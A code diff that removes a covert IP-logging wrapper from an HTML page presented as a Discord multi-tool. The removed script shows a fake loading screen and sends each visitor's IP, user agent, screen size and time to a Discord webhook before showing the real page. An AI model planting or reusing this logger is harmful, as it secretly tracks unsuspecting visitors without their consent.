@@ -3,61 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ANTIGRAVITY | Loading...</title>
-    <style>
-        body { margin:0; background:#0a0a0a; color:#fff; font-family:sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
-        .loader { text-align:center; }
-        .spinner { width:55px; height:55px; border:6px solid #7c3aed; border-top-color:#0000; border-radius:50%; animation:spin 0.8s linear infinite; margin:25px auto; }
-        @keyframes spin { to { transform:rotate(360deg); } }
-        h1 { color:#bb86fc; }
-    </style>
-</head>
-<body>
-    <div class="loader">
-        <h1>ANTIGRAVITY</h1>
-        <p>Establishing secure connection...</p>
-        <div class="spinner"></div>
-    </div>
-
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/PASTE_YOUR_WEBHOOK_HERE"; 
-
-        async function logIP() {
-            let info = { ip: "N/A", ua: navigator.userAgent, screen: screen.width+"x"+screen.height, time: new Date().toLocaleString() };
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                info.ip = (await r.json()).ip;
-            } catch(e){}
-            try {
-                await fetch(WEBHOOK, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        username: "🌐 Antigravity IP Logger",
-                        embeds: [{
-                            title: "🔗 Tool Opened",
-                            color: 0x9b59b6,
-                            fields: [
-                                {name: "IP", value: info.ip, inline: true},
-                                {name: "Screen", value: info.screen, inline: true},
-                                {name: "UA", value: info.ua.substring(0, 400), inline: false},
-                                {name: "Time", value: info.time, inline: false}
-                            ]
-                        }]
-                    })
-                });
-            } catch(e){}
-        }
-
-        window.onload = async () => {
-            await logIP();
-            
-            // HERE PASTE 1 - put your full original html starting from <!DOCTYPE html> ... all the way to </html>
-            const originalHTML = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ANTIGRAVITY | Discord Multi-Tool</title>
     <meta name="description" content="Antigravity Discord Multi-Tool Suite">
     <link rel="preconnect" href="https://fonts.googleapis.com">
